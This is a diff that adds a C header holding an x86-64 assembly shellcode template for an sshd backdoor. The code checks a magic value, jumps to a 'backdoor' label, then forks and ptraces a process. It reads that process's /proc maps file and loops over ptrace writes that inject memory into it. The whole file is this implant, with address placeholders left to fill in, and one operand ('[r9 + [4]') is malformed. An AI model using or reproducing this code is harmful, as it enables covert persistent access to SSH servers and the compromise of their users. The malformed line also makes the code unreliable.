@@ -1,0 +1,6 @@
+#ifndef SSHD_EXECVE
+#define SSHD_EXECVE
+
+char sshd_execve[] = "push rdi;push rsi;push rdx;push rcx;push rbx;push r10;push r8;push rax;;mov r8, %lx;;mov r9, r8;add r9, %lx;;mov rbx, r8;add rbx, %lx;;mov ax, [r9];cmp ax, 0x3316;jne return_normal;;;backdoor:;push 0x39;pop rax;;syscall;;cmp rax, 0x0;je return_normal;;tracer:;mov dword ptr [r9 + 4], eax;;;push 0x65;pop rax;;push 0x10;pop rdi;;mov esi, [r9 + 4];;syscall;;;push 0x3d;pop rax;;syscall;;;mov ecx, [r9 + [4];;push 0x18;pop rsi;;mov rax, 0x2f6d617073;push rax;mov rax, 0x2f70726f632f2564;push rax;push rsp;pop rdx;;lea rdi, [r9 + 8];;call [r8 + %lx];;;;push 0x2;pop rax;;push 0x0;pop rsi;;syscall;;;push rdi;pop rsi;;push rax;pop rdi;;push 0x0;pop rax;;push 0xc;pop rdx;;syscall;;;lea rdi, [r9 + 8];;push 0x0;pop rsi;;push 0x10;pop rdx;;call [r8 + %lx];;;;mov qword ptr [r9 + 8], rax;;;lea r10, [r9 + 8 + %lx];;push 0x5;pop rdi;;mov rsi, [r9 + 4];;;lea rdx, [r8 + %lx];;syscall;;;mov rdx, r10;;lea r10, [rw_gap + 0x10];;mov r8, %lx;;;loop:;add rdx, 8;add r10, 8;syscall;;cmp rdx, %lx;jl loop;;push 0x3c;pop rax;push 0x0;pop rdi;syscall;;;return_normal:;;pop rax;pop r8;pop r10;pop rbx;pop rcx;pop rdx;pop rsi;pop rdi;call [r9 + %lx];;;ret;";
+
+#endif
